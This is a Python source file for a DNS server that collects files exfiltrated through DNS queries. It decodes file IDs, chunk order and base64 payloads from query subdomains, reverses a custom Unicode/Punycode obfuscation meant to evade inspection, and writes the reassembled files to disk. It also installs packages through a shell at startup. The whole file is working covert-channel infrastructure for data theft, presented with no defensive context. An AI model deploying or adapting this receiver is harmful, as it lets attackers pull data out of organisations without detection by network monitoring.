import os
import pprint
import socket
import subprocess
import traceback
import argparse


def install_and_import(package, package_and_version, from_imports=None):
    try:
        if from_imports:
            module = __import__(package, fromlist=from_imports)
            globals().update({name: getattr(module, name) for name in from_imports})
        else:
            __import__(package)

    except ImportError:
        print(f"{package} not installed. Installing...")
        subprocess.call(f"pip install {package_and_version}", shell=True)

        if from_imports:
            module = __import__(package, fromlist=from_imports)
            globals().update({name: getattr(module, name) for name in from_imports})

        # Now try to import again
        __import__(package)


install_and_import("base64", "cryptography==39.0.1")
install_and_import("base64", "chardet==5.2.0")
install_and_import("tldextract", "tldextract==5.1.1")
install_and_import("dns.resolver", "dnspython==2.0.0")
install_and_import("yagmail", "yagmail==0.15.293")
install_and_import("yagmail", "httpcore==0.13.3")

import base64
import dns.resolver
import dns.message
import dns.rrset
import dns.rdataclass
import dns.rdatatype
import dns.rcode
import tldextract

uppercase_mapping = {
    'A': 'â',
    'B': 'ᶀ',
    'C': 'ç',
    'D': 'ᶁ',
    'E': 'ê',
    'F': 'ᶂ',
    'G': 'ğ',
    'H': 'ⱨ',
    'I': 'ı',
    'J': 'ɟ',
    'K': 'ᶄ',
    'L': 'ɭ',
    'M': 'ɱ',
    'N': 'ᶇ',
    'O': 'ö',
    'P': 'ᶈ',
    'Q': 'ʠ',
    'R': 'ɼ',
    'S': 'ş',
    'T': 'ƫ',
    'U': 'ü',
    'V': 'ᶌ',
    'W': 'ŵ',
    'X': 'ᶍ',
    'Y': 'ỷ',
    'Z': 'ʐ',
    '=': 'ᵻ',
    '/': 'ᶖ',
    '+': 'ë'
}
uppercase_demapping = {v: k for k, v in uppercase_mapping.items()}

print("version 1.0.2")

def decode64(text):
    decoded_content = base64.b64decode(text)
    return decoded_content.decode("utf-8")


def decode_base64_to_file(content, output_file_path):

    decoded_bytes = base64.b64decode(content)
    #decoded_text = decoded_bytes.decode('utf-8') wb used for file open
    with open(output_file_path, 'wb') as output_file:
        output_file.write(decoded_bytes)

    print(f"{output_file_path} has been written.")

def decode_upper_case(text):
    try:
        text = "xn--" + text
        text = text.encode("utf-8")
        text = text.decode('idna')
        text = apply_demapper(text, uppercase_demapping)
    except:
        pass

    return text


def apply_demapper(mapped_string, demapping):
    demapped_string = ""
    for char in mapped_string:
        if char in demapping:
            demapped_string += demapping[char]
        else:
            demapped_string += char
    return demapped_string



def combine_results(query, file_chunks, out_dir):
    query = query.lower()
    query = query.strip(".")

    ext = tldextract.extract(query)
    domain = ext.registered_domain
    subdomain = ext.subdomain
    parsed_subdomain = subdomain.partition("-")

    if len(parsed_subdomain) > 1:
        file_identifier = parsed_subdomain[0]
        pl2 = parsed_subdomain[2].partition("-")
        order = int(pl2[0])
        payload = pl2[2]
        payload = decode_upper_case(payload)

        if file_identifier in file_chunks and file_chunks[file_identifier]["file_name"]:

            if payload == "ZmluaXNo":  # base64 for finish
                content = "".join(file_chunks[file_identifier]["data"])
                decoded_content = content.encode("utf-8")

                if 'file_name' in file_chunks[file_identifier] and file_chunks[file_identifier]["file_name"]:
                    out_file = f"{out_dir}/{file_identifier}/{file_chunks[file_identifier]['file_name']}"
                    os.makedirs(f"{out_dir}/{file_identifier}", exist_ok=True)
                    decode_base64_to_file(decoded_content, out_file)
                    del file_chunks[file_identifier]

            else:
                if len(file_chunks[file_identifier]["data"]) > 0:
                    data_index = order // 10 - 1
                    file_chunks[file_identifier]["data"].insert(data_index, payload)

        else:
            if order == 0:
                #payload = decode64(payload)
                #payload = payload.rpartition("-")
                #file_name = payload[0]
                #part_size = int(payload[2])

                file_chunks[file_identifier] = {"file_name": None, "data": [], "file_name_chunks": [payload]}

            elif order < 10:
                #payload = decode64(payload)
                #payload = payload.rpartition("-")
                #file_name = payload[0]
                #part_size = int(payload[2])
                file_chunks[file_identifier]["file_name_chunks"].insert(order, payload)

            elif order == 10:
                file_name_payload = "".join(file_chunks[file_identifier]["file_name_chunks"])
                file_payload = decode64(file_name_payload)
                file_payload = file_payload.rpartition("-")
                file_name = file_payload[0]
                part_size = int(file_payload[2])

                file_chunks[file_identifier]["file_name"] = file_name
                data_index = order//10-1
                file_chunks[file_identifier]["data"].insert(data_index, payload)

    return file_chunks


def dns_response(query, ttl, response_ip, file_chunks, out_dir):
    response = dns.message.make_response(query)

    # Check the query type
    qname = query.question[0].name
    qtype = query.question[0].rdtype

    if qtype == dns.rdatatype.A:
        # Assuming the query is an A record query
        answer = dns.rrset.from_text(qname, ttl, dns.rdataclass.IN, dns.rdatatype.A, response_ip)
        print(answer)
        response.answer.append(answer)
        response.set_rcode(dns.rcode.NOERROR)
        file_chunks = combine_results(str(qname), file_chunks, out_dir)
    else:
        # If the query type is not A, respond with an empty answer section
        response.set_rcode(dns.rcode.NXDOMAIN)

    return response, file_chunks


def dns_server(host, port, ttl, response_ip, out_dir, debug):
    server_address = (host, port)
    file_chunks = dict()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
            for i in range(0, 3):
                try:
                    udp_socket.bind(server_address)
                    print(f"DNS server listening on {host}:{port}")
                    break
                except:
                    print(f"Cannot bind server. trying again... {i}")

            while True:
                try:
                    data, client_address = udp_socket.recvfrom(4096)
                    query = dns.message.from_wire(data)
                    response, file_chunks = dns_response(query, ttl, response_ip, file_chunks, out_dir)
                    udp_socket.sendto(response.to_wire(), client_address)

                except KeyboardInterrupt as k:
                    exit(0)
                except Exception as e:
                    if debug == 1:
                        traceback.print_exc()
                    print(f"error when processing requests: {e}. Code running again...")

    except KeyboardInterrupt as k:
        exit(0)

    except Exception as e:
        if debug == 1:
            traceback.print_exc()
        print(f"exception: {e}. Code running again.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simple DNS server with argparse.')
    parser.add_argument('--host', default='0.0.0.0', help='Host address to bind (default: 0.0.0.0)')
    parser.add_argument('--outdir', default='.', help='Output directory that files will be saved. default: .')
    parser.add_argument('--port', type=int, default=9999, help='Port to bind (default: 9999)')
    parser.add_argument('--ttl', type=int, default=300, help='Time to Live (TTL) for the DNS response (default: 300)')
    parser.add_argument('--debug', type=int, default=0, help='debug parameter 0: slient mode, 1: debug mode')
    parser.add_argument('--response-ip', default='4.3.2.1',
                        help='IP address to respond with (default: 4.3.2.1)')

    args = parser.parse_args()

    dns_server(args.host, args.port, args.ttl, args.response_ip, args.outdir, args.debug)
